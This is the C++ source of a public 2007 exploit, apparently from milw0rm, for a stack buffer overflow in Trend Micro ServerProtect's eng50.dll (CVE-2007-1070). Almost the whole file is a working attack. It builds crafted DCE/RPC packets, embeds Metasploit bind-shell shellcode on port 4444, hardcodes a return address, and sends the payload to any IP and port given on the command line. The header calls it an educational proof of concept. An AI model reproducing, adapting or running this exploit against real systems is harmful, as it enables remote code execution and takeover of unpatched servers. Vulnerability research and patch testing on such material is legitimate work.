/* 
 * Copyright (c) 2007 devcode
 *
 *
 *			^^ D E V C O D E ^^
 *
 * Trend Micro ServerProtect eng50.dll Stack Overflow
 * [CVE-2007-1070]
 *
 *
 * Description:
 *    A boundary error within a function in eng50.dll can be
 *    exploited to cause a stack-based buffer overflow via a
 *    specially crafted RPC request to the SpntSvc.exe service.
 *
 * Hotfix/Patch:
 *    http://www.trendmicro.com/download/product.asp?productid=17
 *
 * Vulnerable systems:
 *    ServerProtect for Windows 5.58
 *    ServerProtect for EMC 5.58
 *    ServerProtect for Network Appliance Filer 5.61
 *    ServerProtect for Network Appliance Filer 5.62
 *
 * Tested on:
 * 	  Microsoft Windows 2000 SP4
 * 
 *    This is a PoC and was created for educational purposes only. The
 *    author is not held responsible if this PoC does not work or is 
 *    used for any other purposes than the one stated above.
 *
 * Notes:
 *	  <3 TippingPoint for technical details. Had this made few days after
 *    disclosure (few months back), was rlsd on r1918 about a week ago 
 *    and I notice trend micro exploit reports on isc.sans.org. DIDNT KNOW
 *    I WAS THIS HOT DAYUM
 *
 *
 */
#include <iostream>
#include <windows.h>
 
#pragma comment( lib, "ws2_32.lib" )
 
/* 25288888-bd5b-11d1-9d53-0080c83a5c2c v1.0 */
unsigned char uszDceBind[] =
	"\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
	"\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00" 
	"\x88\x88\x28\x25\x5B\xBD\xD1\x11\x9D\x53\x00\x80\xC8\x3A\x5C\x2C" 
	"\x01\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
	"\x2B\x10\x48\x60\x02\x00\x00\x00";
 
/* rpc_opnum_0 */
unsigned char uszDceCall[] =
	"\x05\x00\x00\x83\x10\x00\x00\x00\x08\x08\x00\x00\x01\x00\x00\x00"
	"\xE0\x07\x00\x00\x00\x00\x00\x00\x88\x88\x28\x25\x5B\xBD\xD1\x11"
	"\x9D\x53\x00\x80\xC8\x3A\x5C\x2C\x04\x00\x03\x00\xD0\x07\x00\x00";
 
/* win32_bind -  EXITFUNC=thread LPORT=4444 Size=342 Encoder=PexFnstenvMov http://metasploit.com */
unsigned char uszShellcode[] =
	"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x76\xd2\xab"
	"\x1f\x83\xeb\xfc\xe2\xf4\x8a\xb8\x40\x52\x9e\x2b\x54\xe0\x89\xb2"
	"\x20\x73\x52\xf6\x20\x5a\x4a\x59\xd7\x1a\x0e\xd3\x44\x94\x39\xca"
	"\x20\x40\x56\xd3\x40\x56\xfd\xe6\x20\x1e\x98\xe3\x6b\x86\xda\x56"
	"\x6b\x6b\x71\x13\x61\x12\x77\x10\x40\xeb\x4d\x86\x8f\x37\x03\x37"
	"\x20\x40\x52\xd3\x40\x79\xfd\xde\xe0\x94\x29\xce\xaa\xf4\x75\xfe"
	"\x20\x96\x1a\xf6\xb7\x7e\xb5\xe3\x70\x7b\xfd\x91\x9b\x94\x36\xde"
	"\x20\x6f\x6a\x7f\x20\x5f\x7e\x8c\xc3\x91\x38\xdc\x47\x4f\x89\x04"
	"\xcd\x4c\x10\xba\x98\x2d\x1e\xa5\xd8\x2d\x29\x86\x54\xcf\x1e\x19"
	"\x46\xe3\x4d\x82\x54\xc9\x29\x5b\x4e\x79\xf7\x3f\xa3\x1d\x23\xb8"
	"\xa9\xe0\xa6\xba\x72\x16\x83\x7f\xfc\xe0\xa0\x81\xf8\x4c\x25\x81"
	"\xe8\x4c\x35\x81\x54\xcf\x10\xba\xba\x43\x10\x81\x22\xfe\xe3\xba"
	"\x0f\x05\x06\x15\xfc\xe0\xa0\xb8\xbb\x4e\x23\x2d\x7b\x77\xd2\x7f"
	"\x85\xf6\x21\x2d\x7d\x4c\x23\x2d\x7b\x77\x93\x9b\x2d\x56\x21\x2d"
	"\x7d\x4f\x22\x86\xfe\xe0\xa6\x41\xc3\xf8\x0f\x14\xd2\x48\x89\x04"
	"\xfe\xe0\xa6\xb4\xc1\x7b\x10\xba\xc8\x72\xff\x37\xc1\x4f\x2f\xfb"
	"\x67\x96\x91\xb8\xef\x96\x94\xe3\x6b\xec\xdc\x2c\xe9\x32\x88\x90"
	"\x87\x8c\xfb\xa8\x93\xb4\xdd\x79\xc3\x6d\x88\x61\xbd\xe0\x03\x96"
	"\x54\xc9\x2d\x85\xf9\x4e\x27\x83\xc1\x1e\x27\x83\xfe\x4e\x89\x02"
	"\xc3\xb2\xaf\xd7\x65\x4c\x89\x04\xc1\xe0\x89\xe5\x54\xcf\xfd\x85"
	"\x57\x9c\xb2\xb6\x54\xc9\x24\x2d\x7b\x77\x99\x1c\x4b\x7f\x25\x2d"
	"\x7d\xe0\xa6\xd2\xab\x1f";
 
void usage( ) {
	printf("\n\t\tTrend Micro ServerProtect Stack Overflow\n"
			"\t\t\t(c) 2007 devcode\n\n"
			"usage: tmicro.exe <ip> <port>\n");
}
 
int main( int argc, char **argv ) {
	WSADATA wsaData;
	SOCKET sConnect;
	SOCKADDR_IN sockAddr;
	char szRecvBuf[512];
	unsigned char uszPacket[2056];
	int nRet;
 
	if ( argc < 3 ) {
		usage( );
		return -1;
	}
 
	if ( WSAStartup( MAKEWORD( 2, 0 ), &wsaData ) != NO_ERROR ) {
		printf("[-] Unable to startup winsock\n");
		return -1;
	}
 
	sConnect = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( sConnect == INVALID_SOCKET ) {
		printf("[-] Invalid socket\n");
		return -1;
	}
 
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = inet_addr( argv[1] );	
	sockAddr.sin_port = htons( atoi( argv[2] ) );
 
	printf("[+] Connecting to %s:%s\n", argv[1], argv[2] );
	nRet = connect( sConnect, (SOCKADDR *)&sockAddr, sizeof( sockAddr ) );
	if ( nRet == SOCKET_ERROR ) {
		printf("[-] Cannot connect to server\n");
		closesocket( sConnect );
		return -1;
	}
 
	printf("[+] Sending DCE Bind packet...\n");
	nRet = send( sConnect, (const char *)uszDceBind, sizeof( uszDceBind ) - 1, 0 );
	if ( nRet  == SOCKET_ERROR ) {
		printf("[-] Cannot send\n");
		closesocket( sConnect );
		return -1;
	}
 
	nRet = recv( sConnect, szRecvBuf, sizeof( szRecvBuf ), 0 );
	if ( nRet <= 0 ) {
		printf("[-] Recv failed\n");
		closesocket( sConnect );
		return -1;
	}
 
	memset( uszPacket, 0x41, sizeof( uszPacket ) );
	memcpy( uszPacket, (const char *)uszDceCall, sizeof( uszDceCall ) );
	memcpy( uszPacket+48, uszShellcode, sizeof( uszShellcode ) - 1 );
	/* call ebx, 0x6574131C, TmRpcSrv.dll */
	/* jmp ebx, 0x7C4E4A66, kernel32.dll */
	memcpy( uszPacket + 1198, "\x1C\x13\x74\x65", 4 );
	memcpy( uszPacket + 2048, "\xD0\x07\x00\x00\xD0\x07\x00\x00", 8 );
 
	printf("[+] Sending DCE Request packet...\n");
	nRet = send( sConnect, (const char *)uszPacket, sizeof( uszPacket ), 0 );
	if ( nRet == SOCKET_ERROR ) {
		printf("[-] Cannot send\n");
		closesocket( sConnect );
		return -1;
	}
 
	printf("[+] Check shell on port 4444 :)\n");	
	nRet = recv( sConnect, szRecvBuf, sizeof( szRecvBuf ), 0 );	
	closesocket( sConnect );
	return 0;
}

// milw0rm.com [2007-09-06]
